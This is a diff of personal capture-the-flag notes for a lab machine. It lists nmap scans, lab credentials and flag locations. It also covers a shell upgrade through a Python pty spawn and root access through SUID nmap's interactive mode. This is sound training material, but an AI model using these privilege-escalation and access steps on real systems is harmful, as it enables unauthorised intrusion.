@@ -1,4 +1,6 @@
 # Scannings
+
+## Target 
 ```
 Not shown: 65532 filtered ports
 Reason: 65532 no-responses
@@ -26,16 +28,35 @@ Web server at ports 80 & 443
 
 Brute Force?
 
+## Other hosts
+Nmap scan report for **10.10.152.90**
+22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http          syn-ack ttl 63 WebSockify Python/3.6.9
+111/tcp  open  rpcbind       syn-ack ttl 63 2-4 (RPC #100000)
+3389/tcp open  ms-wbt-server syn-ack ttl 63 xrdp
+5901/tcp open  vnc           syn-ack ttl 63 VNC (protocol 3.8)
+6001/tcp open  X11           syn-ack ttl 63 (access denied)
+8000/tcp open  http-alt      syn-ack ttl 62 ecstatic-3.3.2
 
-### First flag
+Nmap scan report for **10.10.152.95**
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for **10.10.152.203**
+22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+5901/tcp open  vnc           syn-ack ttl 63 VNC (protocol 3.8)
+6001/tcp open  X11           syn-ack ttl 63 (access denied)
+8000/tcp open  http-alt      syn-ack ttl 62 ecstatic-3.3.2
+
+
+# First flag
 /robots.txt reveals the first flag, which is accessible under /flag-1-of-3.txt
 
 ![Robots](./img/robots.png)
 
 
-### Second flag
+# Second flag
 
-TODO: How?
 `elliot:ER28-0652`
 
 As elliot is administrator, we can generate a new password for the mich05654 user:
@@ -53,3 +74,24 @@ Cracking the hash with HashCat
 We then use python to obtain a terminal to login to the robot user
 `echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py`
 `python /tmp/asdf.py`
+
+# Third flag
+
+- Brainstorm
+- - X SSH into other machines with obtained credentials 
+- - X Check HTTP servers of other hosts
+- - [->] Obtain root on original machine
+- - X Scan ALL ports of other hosts
+- - X Find vuln for ecstatic/CyberChef
+
+Enumerating the target machine we find: 
+![NMAP SUID](./img/nmap)
+
+This seems to be an old version of nmap, not providing a scripting engine.
+However, the interactive mode is available.
+We can run:  
+```
+$ nmap --interactive
+$ ! ls /root/
+$ ! cat /root/key-3-of-3.txt
+```
